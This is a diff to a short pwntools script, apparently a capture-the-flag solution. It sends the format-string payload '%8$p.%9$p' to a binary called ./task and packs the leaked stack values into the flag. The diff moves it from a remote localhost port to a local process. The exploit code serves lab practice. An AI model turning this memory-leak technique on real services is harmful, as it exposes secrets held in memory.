@@ -3,19 +3,18 @@
 from pwn import *
 
 #context.log_level = "debug"
+elf = ELF("./task", checksec=False)
+context.binary = elf
 
-LOCAL_BINARY = "./task"
-REMOTE_IP = "127.0.0.1"
-REMOTE_PORT = 9001
-
-#p = process(LOCAL_BINARY)
-p = remote(REMOTE_IP, REMOTE_PORT)
-#gdb.attach(p, gdbscript="")
+p = elf.process()
+#p = elf.debug(gdbscript="")
+#p = remote("127.0.0.1", 9001)
 
 p.sendline(b"%8$p.%9$p")
 
-leaks = p.readline().decode().split(".")
+leaks = p.read().decode().split(".")
+
 flag = struct.pack("<Q", int(leaks[0], 16))
 flag += struct.pack("<Q", int(leaks[1], 16))
 
-print(flag)
+print(flag[:-3].decode())
